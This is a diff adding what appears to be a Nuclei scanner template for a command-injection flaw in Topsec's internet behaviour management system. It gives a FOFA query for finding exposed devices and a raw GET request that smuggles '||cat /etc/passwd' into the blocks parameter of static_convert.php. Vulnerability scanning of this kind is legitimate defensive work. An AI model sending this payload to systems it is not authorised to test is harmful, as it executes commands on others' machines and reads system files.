@@ -1,0 +1,26 @@
+id: TopsecACM-static_convert-rce
+
+info:
+  name: 天融信上网行为管理系统系统某接口 RCE
+  author: god
+  severity: critical
+  description: 天融信上网行为管理系统系统某接口 RCE
+  metadata:
+    fofa-query: app="天融信-上网行为管理系统"
+  tags: rce,topsec
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd HTTP/1.1
+    Host: {{Hostname}}
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'contains(body_1, "root")'
+      condition: and
